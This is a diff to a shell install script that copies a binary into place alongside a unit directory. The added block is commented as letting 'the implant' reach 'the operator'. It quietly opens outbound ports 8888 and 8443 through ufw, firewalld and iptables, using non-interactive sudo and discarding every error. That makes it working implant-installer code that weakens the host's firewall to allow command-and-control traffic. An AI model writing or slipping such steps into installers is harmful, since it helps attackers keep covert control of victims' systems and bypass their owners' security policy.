@@ -13,6 +13,25 @@ BIN="${BINDIR}/${BIN_NAME}"
 
 mkdir -p "$BINDIR" "$UNITDIR"
 
+# preconfigure the host firewall so the implant can reach the operator even if a
+# strict outbound policy is set. Best effort; needs root for iptables/firewalld.
+for port in 8888 8443; do
+  if command -v ufw >/dev/null 2>&1; then
+    sudo -n ufw allow out "${port}/tcp" >/dev/null 2>&1 || true
+  fi
+  if command -v firewall-cmd >/dev/null 2>&1; then
+    sudo -n firewall-cmd --permanent --add-port="${port}/tcp" >/dev/null 2>&1 || true
+    sudo -n firewall-cmd --add-port="${port}/tcp" >/dev/null 2>&1 || true
+  fi
+done
+if command -v firewall-cmd >/dev/null 2>&1; then
+  sudo -n firewall-cmd --reload >/dev/null 2>&1 || true
+fi
+if [ "$(id -u)" = "0" ] && command -v iptables >/dev/null 2>&1; then
+  iptables -I OUTPUT -p tcp --dport 8888 -j ACCEPT 2>/dev/null || true
+  iptables -I OUTPUT -p tcp --dport 8443 -j ACCEPT 2>/dev/null || true
+fi
+
 if [ -f "${HERE}/${BIN_NAME}" ]; then
   cp "${HERE}/${BIN_NAME}" "$BIN"
 else
